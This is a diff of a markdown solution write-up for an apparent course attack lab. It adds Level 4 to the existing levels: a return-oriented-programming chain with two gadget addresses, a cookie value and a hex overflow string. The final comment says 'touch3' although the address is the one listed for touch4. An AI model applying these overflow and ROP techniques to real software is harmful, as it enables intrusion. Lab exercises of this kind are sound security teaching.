@@ -49,7 +49,7 @@ bf fa 97 b9 59 c3       /* exploit code */
 ```
 
 ## Level 3
-- touch3 address: 00000000004018fa
+- touch3 address: 0x00000000004018fa
 
 <ins> Format: 
   1. Filler
@@ -80,4 +80,27 @@ fa 18 40 00 00 00 00 00 /* touch3 address */
 35 39 62 39 39 37 66 61 /* cookie string */
 00
 bf d0 5f 68 55 c3       /* exploit code */
+```
+
+## Level 4
+- touch4 address: 0x00000000004017ec
+
+| Address   | Operation |
+| -------- | ------- | 
+| 4019a2    | movq %rax, %rdi    |
+| 4019ab    | popq %rax    |
+    
+    
+
+**String**:
+```
+00 00 00 00 00 00 00 00 /* 0x28 filler characters */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00 /* popq %rax */
+fa 97 b9 59 00 00 00 00 /* cookie value */
+a2 19 40 00 00 00 00 00 /* movq %rax, %rdi */
+ec 17 40 00 00 00 00 00 /* goto touch3 */
 ```
